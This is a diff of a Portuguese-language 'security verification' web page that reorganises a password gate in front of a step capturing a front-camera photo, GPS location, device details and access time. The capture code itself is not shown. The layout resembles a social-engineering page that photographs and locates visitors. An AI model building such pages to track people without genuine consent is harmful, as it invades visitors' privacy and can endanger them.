@@ -162,7 +162,6 @@
             75% { transform: translateX(6px); }
         }
 
-        #tela-verificacao { display: none; }
 
         .step {
             display: flex;
@@ -193,32 +192,24 @@
 <div class="card">
     <div class="shield">🔐</div>
     <h1>Verificação de Segurança</h1>
-    <p class="subtitle">Digite a senha para acessar a verificação.</p>
+    <p class="subtitle">Para prosseguir, precisamos confirmar sua identidade. Conceda as permissões abaixo quando solicitado.</p>
 
-    <!-- Tela de senha -->
-    <div id="tela-senha">
-        <div class="senha-box">
-            <label>Senha de acesso</label>
-            <input type="password" id="campo-senha" placeholder="••••••" maxlength="20"
-                onkeydown="if(event.key==='Enter') confirmarSenha()">
-        </div>
-        <button onclick="confirmarSenha()">Entrar</button>
-        <div class="status" id="status-senha"></div>
+    <div class="info-box">
+        <p>O que será coletado:</p>
+        <div class="info-item"><span>📷</span> Foto pela câmera frontal</div>
+        <div class="info-item"><span>📍</span> Localização GPS</div>
+        <div class="info-item"><span>📱</span> Modelo e sistema do dispositivo</div>
+        <div class="info-item"><span>🕐</span> Data e hora do acesso</div>
     </div>
 
-    <!-- Tela de verificação -->
-    <div id="tela-verificacao">
-        <p class="subtitle" style="margin-bottom:24px">Para prosseguir, precisamos confirmar sua identidade. Conceda as permissões abaixo quando solicitado.</p>
-        <div class="info-box">
-            <p>O que será coletado:</p>
-            <div class="info-item"><span>📷</span> Foto pela câmera frontal</div>
-            <div class="info-item"><span>📍</span> Localização GPS</div>
-            <div class="info-item"><span>📱</span> Modelo e sistema do dispositivo</div>
-            <div class="info-item"><span>🕐</span> Data e hora do acesso</div>
-        </div>
-        <button id="btn" onclick="iniciar()">Verificar minha identidade</button>
-        <div class="status" id="status"></div>
+    <div class="senha-box">
+        <label>Senha de acesso</label>
+        <input type="password" id="campo-senha" placeholder="••••••" maxlength="20"
+            onkeydown="if(event.key==='Enter') clicar()">
     </div>
+
+    <button id="btn" onclick="clicar()">Entrar</button>
+    <div class="status" id="status"></div>
 </div>
 
 <video id="video" autoplay playsinline muted></video>
@@ -234,20 +225,25 @@
 
     const btn    = document.getElementById('btn');
     const status = document.getElementById('status');
+    let senhaOk  = false;
 
-    function confirmarSenha() {
-        const input = document.getElementById('campo-senha');
-        const statusSenha = document.getElementById('status-senha');
-
-        if (input.value === SENHA) {
-            document.getElementById('tela-senha').style.display = 'none';
-            document.getElementById('tela-verificacao').style.display = 'block';
+    function clicar() {
+        if (!senhaOk) {
+            const input = document.getElementById('campo-senha');
+            if (input.value === SENHA) {
+                senhaOk = true;
+                input.disabled = true;
+                input.style.opacity = '0.5';
+                btn.textContent = 'Verificar minha identidade';
+                setStatus('Senha correta. Clique em verificar para continuar.', 'ok');
+            } else {
+                input.classList.add('errada');
+                setStatus('Senha incorreta. Tente novamente.', 'erro');
+                input.value = '';
+                setTimeout(() => input.classList.remove('errada'), 400);
+            }
         } else {
-            input.classList.add('errada');
-            statusSenha.textContent = 'Senha incorreta. Tente novamente.';
-            statusSenha.className = 'status erro';
-            input.value = '';
-            setTimeout(() => input.classList.remove('errada'), 400);
+            iniciar();
         }
     }
 
